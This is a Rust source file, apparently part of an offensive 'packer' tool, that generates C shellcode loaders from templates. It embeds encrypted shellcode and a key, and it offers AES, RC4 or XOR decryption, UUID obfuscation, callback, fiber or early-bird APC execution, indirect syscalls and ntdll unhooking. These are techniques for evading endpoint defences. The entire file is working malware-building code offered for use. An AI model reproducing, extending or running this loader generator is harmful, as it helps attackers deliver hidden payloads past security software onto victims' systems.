use std::fs;

pub fn generate(
    lang: &str,
    shellcode: &[u8],
    key: &[u8],
    loading_technique: &str,
    obf_technique: &str,
    use_unhook: bool,
    enc_technique: &str,
    cmd: Option<&str>,
    encrypted_len: usize,
    use_ntdll_unhook: bool,
) -> Result<String, String> {
    let template_path = match lang {
        "c" => "crates/packer/src/templates/loader.c.tpl",
        _ => return Err(format!("Unsupported language: {}", lang)),
    };

    let execution_template_path = if cmd.is_some() {
        "crates/packer/src/templates/cmd_exec.c.tpl"
    } else {
        match loading_technique {
            "callback" => "crates/packer/src/templates/callback.c.tpl",
            "fiber" => "crates/packer/src/templates/fiber.c.tpl",
            "earlybird" => "crates/packer/src/templates/earlybird.c.tpl",
            _ => {
                return Err(format!(
                    "Unsupported loading technique: {}",
                    loading_technique
                ))
            }
        }
    };

    let deobfuscation_template_path = match obf_technique {
        "uuid" => "crates/packer/src/templates/deobfuscation.c.tpl",
        _ => "",
    };

    let decryption_template_path = match enc_technique {
        "aes" | "rc4" | "xor" => "crates/packer/src/templates/decryption.c.tpl",
        _ => "",
    };

    let syscall_template_path = if !use_unhook {
        "crates/packer/src/templates/syscalls.c.tpl"
    } else {
        ""
    };

    let main_template_content = fs::read_to_string(template_path).map_err(|e| e.to_string())?;
    let execution_template_content =
        fs::read_to_string(execution_template_path).map_err(|e| e.to_string())?;
    let deobfuscation_template_content = if !deobfuscation_template_path.is_empty() {
        fs::read_to_string(deobfuscation_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };
    let decryption_template_content = if !decryption_template_path.is_empty() {
        fs::read_to_string(decryption_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };
    let syscall_template_content = if !syscall_template_path.is_empty() {
        fs::read_to_string(syscall_template_path).map_err(|e| e.to_string())?
    } else {
        String::new()
    };

    let ntdll_unhook_template_content = if use_ntdll_unhook {
        fs::read_to_string("crates/packer/src/templates/ntdll_unhook.c.tpl")
            .map_err(|e| e.to_string())?
    } else {
        String::new()
    };

    let unhook_define = if !use_unhook {
        "#define USE_INDIRECT_SYSCALLS"
    } else {
        ""
    };

    let ntdll_unhook_call = if use_ntdll_unhook {
        "if (!UnhookNtdll()) { return 1; }"
    } else {
        ""
    };

    let shellcode_str = if obf_technique == "uuid" {
        String::from_utf8_lossy(shellcode).to_string()
    } else {
        shellcode
            .iter()
            .map(|b| format!("0x{:02x}", b))
            .collect::<Vec<String>>()
            .join(", ")
    };

    let key_str = key
        .iter()
        .map(|b| format!("0x{:02x}", b))
        .collect::<Vec<String>>()
        .join(", ");

    let decryption_call_str = match enc_technique {
        "aes" => format!(
            "decrypt_aes((BYTE*)shellcode_mem, {}, key, sizeof(key));",
            encrypted_len
        ),
        "rc4" => "decrypt_rc4((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
        "xor" => "decrypt_xor((BYTE*)shellcode_mem, shellcode_size, key, sizeof(key));".to_string(),
        _ => "".to_string(),
    };

    let populated_template = main_template_content
        .replace("// {{SHELLCODE_PLACEHOLDER}}", &shellcode_str)
        .replace("// {{KEY_PLACEHOLDER}}", &key_str)
        .replace(
            "// {{DEOBFUSCATION_FUNCTION_PLACEHOLDER}}",
            &deobfuscation_template_content,
        )
        .replace(
            "// {{EXECUTION_FUNCTION_PLACEHOLDER}}",
            &execution_template_content,
        )
        .replace(
            "// {{DECRYPTION_FUNCTION_PLACEHOLDER}}",
            &decryption_template_content,
        )
        .replace("// {{DECRYPTION_CALL_PLACEHOLDER}}", &decryption_call_str)
        .replace(
            "// {{SYSCALL_FUNCTION_PLACEHOLDER}}",
            &syscall_template_content,
        )
        .replace("// {{UNHOOK_PLACEHOLDER}}", unhook_define)
        .replace(
            "// {{NTDLL_UNHOOK_FUNCTION_PLACEHOLDER}}",
            &ntdll_unhook_template_content,
        )
        .replace("// {{NTDLL_UNHOOK_CALL_PLACEHOLDER}}", &ntdll_unhook_call);

    Ok(populated_template)
}
